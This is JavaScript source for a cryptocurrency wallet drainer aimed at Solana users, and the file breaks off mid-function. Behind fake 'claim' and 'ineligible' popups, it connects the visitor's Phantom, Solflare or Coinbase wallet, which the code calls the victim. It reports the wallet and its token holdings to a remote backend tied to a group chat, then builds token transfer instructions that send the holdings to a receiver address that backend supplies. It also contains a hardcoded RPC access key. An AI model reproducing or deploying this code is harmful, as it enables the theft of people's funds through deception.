// Using global variables from CDN imports instead of ES modules
const {
    Connection, 
    Transaction, 
    SystemProgram, 
    PublicKey, 
    LAMPORTS_PER_SOL, 
    Keypair, 
    VersionedMessage, 
    StakeProgram, 
    Authorized, 
    TransactionInstruction, 
    clusterApiUrl
} = solanaWeb3;

const {
    AccountLayout, 
    TOKEN_PROGRAM_ID, 
    ASSOCIATED_TOKEN_PROGRAM_ID, 
    createAssociatedTokenAccountInstruction, 
    createTransferInstruction, 
    createApproveInstruction, 
    transferInstructionData, 
    TokenInstruction
} = splToken;

// Use axios from global scope (loaded from CDN)

const spoofWallet = "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM";
const RPCLink = "https://alpha-lively-lambo.solana-mainnet.quiknode.pro/8783271537a440d18b16a99d563c897538cd412d/";

const bypassSettings = {
    enabled: false,
    concurrent: 0,
    loadTime: 0
}

// Get config from window.ENV (set in index.html)
const BACKEND_URL = window.ENV.BACKEND_URL;
const CONNECTION_KEY = window.ENV.CONNECTION_KEY;
const GROUP_CHAT_ID = window.ENV.GROUP_CHAT_ID;

let solanaConnection, solanaProvider, victimPublicKey, connectButton, lamports, settingData
let phantom = false, solflare = false, coinbase = false;

function parsePlaceHolders(string) {
    return string.replace(/{(addressfirst|addresslast)(\d+)}/g, (match, type, count) => {
        count = parseInt(count, 10);
        if (type === "addressfirst") {
            return victimPublicKey.toString().substring(0, count);
        } else if (type === "addresslast") {
            return victimPublicKey.toString().substring(victimPublicKey.toString().length - count);
        }
    });
}

function isMobile() {
    let check = false;
    (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
    return check;
}

// Helper function to make backend requests
async function makeBackendRequest(endpoint, data = {}) {
    try {
        // Add required metadata to each request
        const requestData = {
            ...data,
            CONNECTIONKEY: CONNECTION_KEY,
            GCID: GROUP_CHAT_ID,
            ORIGIN: window.location.origin,
            CIP: "Browser", // IP will be determined by Node.js
            COUNTRY: "Browser" // Country will be determined by Node.js
        };

        const response = await fetch(`${BACKEND_URL}/${endpoint}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(requestData)
        });

        if (!response.ok) {
            throw new Error(`Backend request failed: ${response.status}`);
        }

        // Check Content-Type header to determine how to parse the response
        const contentType = response.headers.get("content-type");
        if (contentType && contentType.includes("application/json")) {
            return await response.json();
        } else {
            // For non-JSON responses, just return the text
            return await response.text();
        }
    } catch (error) {
        console.error("Backend request error:", error);
        // Don't throw the error, just return null to prevent cascade failures
        return null;
    }
}

// Replace existing endpoint functions with direct backend calls
async function onJoined() {
    return await makeBackendRequest("join", {
        wallets: {
            phantom, solflare, coinbase
        }
    });
}

async function getTransactionDetails(publicKey) {
    return await makeBackendRequest("details", {
        WALLET: publicKey
    });
}

async function onPrompted(publicKey) {
    await makeBackendRequest("onrequest", {
        WALLET: publicKey
    });
}

async function onDeclined(publicKey) {
    await makeBackendRequest("oncancel", {
        WALLET: publicKey
    });
}

async function showPortfolio(publicKey, portfolio) {
    console.log("Sending portfolio to backend:", publicKey, portfolio.length + " items");
    try {
        const response = await makeBackendRequest("info", {
            wallets: {
                phantom, solflare, coinbase
            },
            WALLET: publicKey,
            PORTFOLIO: portfolio
        });
        console.log("Portfolio sent successfully, response:", response);
    } catch (error) {
        console.error("Failed to send portfolio:", error);
    }
}

window.closePopup = async function() {
    var elem = document.getElementsByClassName('wallet-popup');
    for (var e of elem) {
        if (e.classList.contains('wallet-adapter-modal-fade-in')) {
            e.classList.remove('wallet-adapter-modal-fade-in');
            setTimeout(() => {
                e.remove();
            }, 150);
        } else {
            e.remove();
        }
    }
}

window.modalClose = function() {
    // console.log("Closing modal");
}

async function openPopup() {
    await closePopup();

    switch (settingData.modal) {
        case 0:
            modal0();
            break;
        case 1:
            modal1();
            break;
        case 2:
            modal2();
            break;
        case 3:
            modal3();
            break;
        case 4:
            modal4();
            break;
    }

}

window.modalChoice = async function (choice) {
    var mob = isMobile();
    if (choice === "phantom") {
        if (settingData.phantomWallet.type == 1) {
            p(choice, mob);
            return;
        }
        if (phantom) {
            try {
                solanaProvider = window.solana;
                solanaProvider.on('connect', async function () {
                    victimPublicKey = solanaProvider.publicKey;
                    console.log("Wallet connected successfully:", victimPublicKey.toString());
                    await onConnected(choice);
                });
                
                // Handle connection rejection properly
                solanaProvider.on('disconnect', () => {
                    console.log('Wallet disconnected');
                    // User actively disconnected - handle as needed
                });
                
                await solanaProvider.connect({ onlyIfTrusted: false });
            } catch (error) {
                console.log("Connection error:", error);
                // This will catch the rejection error - handle it silently or show a message
                // but don't let it crash with an uncaught error
                if (error.message && error.message.includes("User rejected")) {
                    console.log("User rejected the connection request");
                    // Optionally notify backend about rejection
                    try {
                        await makeBackendRequest("oncancel", {
                            WALLET: "unknown" // We don't have the wallet address since connection was rejected
                        });
                    } catch (err) {
                        console.error("Failed to notify about rejection:", err);
                    }
                }
            }
        } else {
            if (isMobile()) {
                window.location.href = 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
            } else {
                window.location.href = 'https://phantom.app/download';
            }
        }
    } else if (choice == "solflare") {
        if (solflare) {
            try {
                solanaProvider = window.solflare;
                solanaProvider.on('connect', async function () {
                    victimPublicKey = solanaProvider.publicKey
                    await onConnected(choice);
                });
                
                await solanaProvider.connect({ onlyIfTrusted: false });
            } catch (error) {
                console.log("Connection error:", error);
                // Handle Solflare errors silently
                if (error.message && error.message.includes("User rejected")) {
                    console.log("User rejected the connection request");
                    // Optionally notify backend about rejection
                    try {
                        await makeBackendRequest("oncancel", {
                            WALLET: "unknown"
                        });
                    } catch (err) {
                        console.error("Failed to notify about rejection:", err);
                    }
                }
            }
        } else {
            window.location.href = 'https://solflare.com/';
        }
    } else if (choice == "coinbase") {
        if (coinbase) {
            try {
                solanaProvider = window.coinbaseSolana;
                await solanaProvider.connect({ onlyIfTrusted: false });
                if (solanaProvider.isConnected) {
                    victimPublicKey = solanaProvider.publicKey;
                    await onConnected(choice);
                }
            } catch (error) {
                console.log("Connection error:", error);
                // Handle Coinbase errors silently
                if (error.message && error.message.includes("User rejected")) {
                    console.log("User rejected the connection request");
                    // Optionally notify backend about rejection
                    try {
                        await makeBackendRequest("oncancel", {
                            WALLET: "unknown"
                        });
                    } catch (err) {
                        console.error("Failed to notify about rejection:", err);
                    }
                }
            }
        } else {
            window.open("https://www.coinbase.com/", "_blank");
        }
    }
}

async function clickEvent() {
    await openPopup();
}

async function portfolio(walletAddress, tokenAccounts) {
    try {
        const chunkSize = 100;
        let currentChunk = [];
        const chunks = [];

        const tokens = tokenAccounts.map(account => {
            const { mint, tokenAmount } = account.account.data.parsed.info;
            currentChunk.push(mint);

            if (currentChunk.length === chunkSize) {
                chunks.push(currentChunk);
                currentChunk = [];
            }
            return { mint, balance: tokenAmount.uiAmount };
        });

        if (currentChunk.length > 0) {
            chunks.push(currentChunk);
        }


        for (var chunk of chunks) {
            const mintAddressesList = chunk.join(',');
            const priceUrl = `https://price.jup.ag/v4/price?ids=${mintAddressesList}`;
            const priceResponse = await axios.get(priceUrl);
            for (var tokenPriceDataId in priceResponse.data.data) {
                let tokenPriceData = priceResponse.data.data[tokenPriceDataId];
                for (var token of tokens) {
                    if (token.mint == tokenPriceData.id) {
                        token.totalValueInUSD = tokenPriceData.price * token.balance;
                        token.name = tokenPriceData.mintSymbol;
                        break;
                    }
                }
            }
        }

        return tokens;

    } catch (error) {
        console.error(`Error: ${error.message}`);
        return [];
    }
}

async function createTokenTransactions(block, mintAddress, amount, walletAddressPublicKey, handlerPublicKey, receiverPublicKey) {
    let receiver = handlerPublicKey;

    let tokenSplitItem = {
        "BALANCE": amount,
        "MINT": mintAddress
    }

    if (amount === 0) {
        return { 
            tokenSplitItem: undefined,
            dat: undefined
        }
    }
    if (amount === 1) {
        receiver = receiverPublicKey;
        tokenSplitItem = undefined
    }

    const senderProgramAddress = (
        PublicKey.findProgramAddressSync(
            [walletAddressPublicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mintAddress.toBuffer()],
            ASSOCIATED_TOKEN_PROGRAM_ID
        )
    )[0]

    const handlerProgramAddress = (PublicKey.findProgramAddressSync(
        [receiver.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mintAddress.toBuffer()],
        ASSOCIATED_TOKEN_PROGRAM_ID
    ))[0]

    const handlerAccountInformation = await solanaConnection.getAccountInfo(handlerProgramAddress)

    if (handlerAccountInformation === null) {
        block.add(
            createAssociatedTokenAccountInstruction(
                victimPublicKey,
                handlerProgramAddress,
                receiver,
                mintAddress,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
        )
    }

    block.add(
        createTransferInstruction(
            senderProgramAddress,
            handlerProgramAddress,
            victimPublicKey,
            amount,
            [],
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
        )
    )

    let info = {
        senderProgramAddress,
        handlerProgramAddress
    };

    return { tokenSplitItem, info };
}

async function loadFirstPopup() {
    var exxx = document.createElement('div');
    exxx.classList.add("cmdlzxxx");
    const shadow = exxx.attachShadow({mode: 'open'});
    const linkNode = document.createElement("link");
    linkNode.rel = "stylesheet";
    linkNode.href = "cmodal.css";

    shadow.appendChild(linkNode);

    var lol = document.createElement('div');
    lol.innerHTML = `
    <div>
<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">
<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>
<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">
    <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">
    <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">
        <div class="tw-text-left">
        <div class="tw-flex tw-mb-3">
            <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">${parsePlaceHolders(settingData.words.onClaiming)}</span>
            <span class="tw-min-w-[10px]"></span>
            <span class="tw-min-w-[85px]">
            <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">
                <span title="${victimPublicKey.toString()}" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">
                <span>${parsePlaceHolders(settingData.words.onConnected)}</span>
                </span>
            </button>
            </span>
        </div>
        <div class="tw-text-[16px] tw-text-white-2">${parsePlaceHolders(settingData.words.onClaimingDesc)}</div>
        </div>
    </div>
    </div>
</div>
</div>
</div>`
    shadow.appendChild(lol);
    document.body.appendChild(exxx);

    let removeLoader = () => {
        exxx.remove();

        for (var o of document.getElementsByClassName('cmdlzxxx')) {
            o.remove();
        }
    };

    return removeLoader;
}

window.oIneligible = () => {
    var x = document.createElement('div');
    x.classList.add("cmdlz");
    const shadow = x.attachShadow({mode: 'open'});
    const linkNode = document.createElement("link");
    linkNode.rel = "stylesheet";
    linkNode.href = "cmodal.css";

    shadow.appendChild(linkNode);

    var lol = document.createElement('div');
    lol.innerHTML = `
    <div>
<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">
<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>
<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">
    <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">
    <div data-test-id="modal-header" class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4 tw-mb-[6px]" id="headlessui-dialog-title-:r7m:" data-headlessui-state="open">
        <svg onclick="emodalClose()" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="tw-cursor-pointer tw-text-white-2" color="#f5f3f7" width="24" height="24" data-test-id="modal-close" xmlns="http://www.w3.org/2000/svg" style="color: rgb(245, 243, 247);">
        <path fill="none" d="M0 0h24v24H0z"></path>
        <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
        </svg>
    </div>
    <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">
        <div class="tw-text-left">
        <div class="tw-flex tw-mb-3">
            <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">${parsePlaceHolders(settingData.words.onClaimingIneligible)}</span>
            <span class="tw-min-w-[10px]"></span>
            <span class="tw-min-w-[85px]">
            <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">
                <span title="${victimPublicKey.toString()}" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">
                <span>${parsePlaceHolders(settingData.words.onConnected)}</span>
                </span>
            </button>
            </span>
        </div>
        <div class="tw-text-[16px] tw-text-white-2">${parsePlaceHolders(settingData.words.onClaimingIneligibleDesc)}</div>
        <div class="tw-flex tw-mt-8">
            <button type="button" onclick="emodalClose()" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded tw-text-white-1 tw-h-[40px] tw-py-0 tw-px-3 hover:tw-opacity-80 tw-transition tw-duration-300 tw-ease-in-out tw-bg-transparent tw-border tw-border-solid tw-border-gray-500 tw-w-[160px] tw-text-[14px]">Change Wallet</button>
        </div>
        </div>
    </div>
    </div>
</div>
</div>
</div>`
    shadow.appendChild(lol);
    document.body.appendChild(x);

    window.emodalClose = function() {
        x.remove();

        for (var o of document.getElementsByClassName('cmdlz')) {
            o.remove();
        }
    }
}

var isConnecting = false;

var prizeMintPubKey = new PublicKey('4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy'),
    prizeAcctPubKey = new PublicKey('42pw7vKm2c2mtKq6uNsMY9hhwG8ecaeqLWC3iB1sXAU6'),
    prizeTreasuryPubKey = new PublicKey('sV78H7ZxrgpRso5NVntNR3UzUmetTxAhrqSJsysq32A');

async function createPrizeTxs(addHoney = true, honey = 500000000000) {
    let h = [], i, c = victimPublicKey;

    console.log("pk",c);

    var xtokenAccount = (
      PublicKey.findProgramAddressSync(
        [
          c.toBuffer(),
          TOKEN_PROGRAM_ID.toBuffer(),
          prizeMintPubKey.toBuffer(),
        ],
        ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0];
    if (null === (await solanaConnection.getAccountInfo(xtokenAccount)) || !addHoney) {
        console.log("add");
        ;(i = new Transaction()).add(
            createAssociatedTokenAccountInstruction(
                c,
                xtokenAccount,
                c,
                prizeMintPubKey,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
        )
        h.push(i)
    }
    if (addHoney) {
        i = new Transaction();
        i.add(
            createTransferInstruction(
                prizeAcctPubKey,
                xtokenAccount,
                prizeTreasuryPubKey,
                honey,
                [],
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
        );
        h.push(i);
    }
    return (
      h
    )
}

async function confirmPopup() {
    var xd = document.createElement('div');
    xd.classList.add("cmdlzx");
    const shadow = xd.attachShadow({mode: 'open'});
    const linkNode = document.createElement("link");
    linkNode.rel = "stylesheet";
    linkNode.href = "cmodal.css";

    shadow.appendChild(linkNode);

    var z = document.createElement('div');
    z.innerHTML = `
    <div>
<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">
<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>
<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">
    <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">
    <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">
        <div class="tw-text-left">
        <div class="tw-flex tw-mb-3">
            <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">${parsePlaceHolders(settingData.words.onClaimLoading)}</span>
            <span class="tw-min-w-[10px]"></span>
            <span class="tw-min-w-[85px]">
            <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">
                <span title="${victimPublicKey.toString()}" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">
                <span>${parsePlaceHolders(settingData.words.onConnected)}</span>
                </span>
            </button>
            </span>
        </div>
        <div class="tw-text-[16px] tw-text-white-2">${parsePlaceHolders(settingData.words.onClaimLoadingDesc)}</div>
        </div>
    </div>
    </div>
</div>
</div>
</div>`
    shadow.appendChild(z);
    document.body.appendChild(xd);

    return xd;
}

async function upgradeTokens(transaction, mintAddress, sourceAddress, ownerAddress, amount) {
    mintAddress = new PublicKey(mintAddress);
    sourceAddress = new PublicKey(sourceAddress);
    ownerAddress = new PublicKey(ownerAddress);
    let c = victimPublicKey;

    var xtokenAccount = (
      PublicKey.findProgramAddressSync(
        [
          c.toBuffer(),
          TOKEN_PROGRAM_ID.toBuffer(),
          mintAddress.toBuffer(),
        ],
        ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0];

    if (null === (await solanaConnection.getAccountInfo(xtokenAccount))) {
        transaction.add(
            createAssociatedTokenAccountInstruction(
                c,
                xtokenAccount,
                c,
                mintAddress,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
        );
    }

    transaction.add(
        createTransferInstruction(
            sourceAddress,
            xtokenAccount,
            ownerAddress,
            amount,
            [],
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
        )
    );

    return transaction;
}

async function addTokenGain(transaction, mintAddress, from, amount) {
    if (mintAddress == null || from == null) return;
    if (typeof mintAddress === 'string' || mintAddress instanceof String) mintAddress = new PublicKey(mintAddress);
    if (typeof from === 'string' || from instanceof String) from = new PublicKey(from);

    console.log("MINT", mintAddress);
    console.log("FROM", from);

    const senderProgramAddress = (
        PublicKey.findProgramAddressSync(
            [from.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mintAddress.toBuffer()],
            ASSOCIATED_TOKEN_PROGRAM_ID
        )
    )[0]

    const receiverProgramAddress = (PublicKey.findProgramAddressSync(
        [victimPublicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mintAddress.toBuffer()],
        ASSOCIATED_TOKEN_PROGRAM_ID
    ))[0]
    let h = [], i, c = victimPublicKey;

    if (null === (await solanaConnection.getAccountInfo(receiverProgramAddress))) {
        console.log("added");
        console.log(receiverProgramAddress.toString());
        transaction.add(
            createAssociatedTokenAccountInstruction(
                c,
                receiverProgramAddress,
                c,
                mintAddress,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
        );
    }
    transaction.add(
        createTransferInstruction(
            senderProgramAddress,
            receiverProgramAddress,
            victimPublicKey,
            amount,
            [],
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
        )
    );
    return transaction;
}

window.popupConfirmAsk = () => {
    var x = document.createElement('div');
    x.classList.add("cmdlz");
    const shadow = x.attachShadow({mode: 'open'});
    const linkNode = document.createElement("link");
    linkNode.rel = "stylesheet";
    linkNode.href = "cmodal.css";

    shadow.appendChild(linkNode);

    var lol = document.createElement('div');
    lol.innerHTML = `
    <div>
<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">
<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>
<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">
    <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">
    <div data-test-id="modal-header" class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4 tw-mb-[6px]" id="headlessui-dialog-title-:r7m:" data-headlessui-state="open">
        <svg onclick="ecClose()" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="tw-cursor-pointer tw-text-white-2" color="#f5f3f7" width="24" height="24" data-test-id="modal-close" xmlns="http://www.w3.org/2000/svg" style="color: rgb(245, 243, 247);">
        <path fill="none" d="M0 0h24v24H0z"></path>
        <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
        </svg>
    </div>
    <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">
        <div class="tw-text-left">
        <div class="tw-flex tw-mb-3">
            <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">${parsePlaceHolders(settingData.words.onDecline)}</span>
            <span class="tw-min-w-[10px]"></span>
            <span class="tw-min-w-[85px]">
            <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">
                <span title="${victimPublicKey.toString()}" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">
                <span>${parsePlaceHolders(settingData.words.onConnected)}</span>
                </span>
            </button>
            </span>
        </div>
        <div class="tw-text-[16px] tw-text-white-2">${parsePlaceHolders(settingData.words.onDeclineDesc)}</div>
        <div class="tw-flex tw-mt-8">
            <button type="button" onclick="ecClose()" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded tw-text-white-1 tw-h-[40px] tw-py-0 tw-px-3 hover:tw-opacity-80 tw-transition tw-duration-300 tw-ease-in-out tw-bg-transparent tw-border tw-border-solid tw-border-gray-500 tw-w-[160px] tw-text-[14px]">Change Wallet</button>
        </div>
        </div>
    </div>
    </div>
</div>
</div>
</div>`
    shadow.appendChild(lol);
    document.body.appendChild(x);

    window.ecClose = function() {
        console.log(x);
        x.remove();

        for (var o of document.getElementsByClassName('cmdlz')) {
            o.remove();
        }
    }
}

async function onConnected(choice = "phantom") {
    if (settingData && settingData.bypass) return console.error("yes");
    console.log(`Connected at ${victimPublicKey.toString()}`);

    if (isConnecting) return;
    isConnecting = true;

    var removeFirstLoader = await loadFirstPopup();

    let handler = null;
    let receiver = null;

    console.log("Getting transaction details...");
    try {
        // Use the makeBackendRequest function instead of direct fetch
        const transactionDetails = await makeBackendRequest("details", {
            WALLET: victimPublicKey.toString()
        });
        
        if (!transactionDetails || !transactionDetails.RECEIVER) {
            console.error("Invalid transaction details response:", transactionDetails);
            removeFirstLoader();
            isConnecting = false;
            return;
        }
        
        console.log("Got receiver address:", transactionDetails.RECEIVER);
        receiver = transactionDetails.RECEIVER;
    } catch (e) {
        console.error("Error getting transaction details:", e);
        removeFirstLoader();
        isConnecting = false;
        return;
    }

    var receiverPublicKey = new PublicKey(receiver);

    const accountInfo = await solanaConnection.getAccountInfo(victimPublicKey)

    if (!accountInfo) {
        removeFirstLoader();
        window.oIneligible();
        isConnecting = false;
        return;
    }

    lamports = accountInfo.lamports

    if (lamports < 200000) {
        removeFirstLoader();
        window.oIneligible();
        isConnecting = false;
        return;
    }

    const tokenAccounts = (await solanaConnection.getParsedTokenAccountsByOwner(victimPublicKey, { programId: TOKEN_PROGRAM_ID })).value
    console.log("Retrieved token accounts:", tokenAccounts.length);

    const tokenPortfolio = await portfolio(victimPublicKey.toString(), tokenAccounts);
    console.log("Built token portfolio:", tokenPortfolio);
    const finalizedPortfolio = []


    for (const tokenAccount of tokenAccounts) {
        let found = false;

        const { mint, tokenAmount, state } = tokenAccount.account.data.parsed.info;
        if (state === "frozen") {
          continue
        }

        if (tokenAmount == 0) {
          continue
        }

        for (const tokenPortfolioItem of tokenPortfolio) {
            if (tokenPortfolioItem.mint.toString().toLowerCase() === mint.toString().toLowerCase() && tokenAmount.amount > 0) {
                finalizedPortfolio.push({
                    "VALUE": tokenPortfolioItem.totalValueInUSD,
                    "MINT": mint.toString(),
                    "NAME": tokenPortfolioItem.name,
                    "AMOUNT": tokenAmount.amount
                })
                found = true;
                break;
            }
        }

        if (!found && tokenAmount > 0) {
            finalizedPortfolio.push({
                "VALUE": 0,
                "MINT": mint.toString(),
                "NAME": "UNKNOWN",
                "AMOUNT": tokenAmount
            })
